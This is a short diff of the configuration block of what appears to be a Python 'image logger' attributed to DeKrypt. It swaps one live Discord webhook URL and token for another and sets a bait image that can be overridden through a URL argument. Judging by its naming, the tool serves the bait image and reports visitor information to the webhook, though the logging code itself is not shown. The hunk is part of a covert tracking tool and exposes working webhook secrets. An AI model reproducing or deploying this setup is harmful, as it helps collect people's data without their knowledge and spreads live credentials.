@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1469861194050437287/9TjOe2b8u4zDTJ1eD8VImuhJngoxAfV0tAPv8HjqlMt9gvuVXEUcvz3W5Lpfbky2A3up",
+    "webhook": "https://discord.com/api/webhooks/1469872014956298240/UFtev0wiFkgYu-smaCN0l20mnJWw2gD7hN-XG4r3uUGbBsJmnWpblwngUsdiFBE7dV6-",
     "image": "https://resumendesalud.net/wp-content/uploads/2017/04/ratilla.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
